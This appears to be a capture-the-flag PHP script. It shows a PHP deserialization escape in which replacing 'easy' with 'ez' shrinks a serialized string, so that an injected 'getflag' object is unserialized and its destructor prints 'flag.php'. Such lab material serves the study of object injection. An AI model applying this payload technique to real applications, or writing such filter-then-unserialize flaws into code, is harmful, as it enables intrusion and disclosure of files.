<?php
highlight_file(__FILE__);

class getflag
{
    public $file;

    public function __destruct()
    {
        if ($this->file === "flag.php") {
            echo file_get_contents($this->file);
        }
    }
}

class tmp
{
    public $str1;
    public $str2;

    public function __construct($str1, $str2)
    {
        $this->str1 = $str1;
        $this->str2 = $str2;
    }

}

$str1 = 'easyeasyeasyeasyeasyeasyeasyeasyeasy';
$str2 = ';s:4:"str2";O:7:"getflag":1:{s:4:"file";s:8:"flag.php";}';
$data = serialize(new tmp($str1, $str2));
$data = str_replace("easy", "ez", $data);
unserialize($data);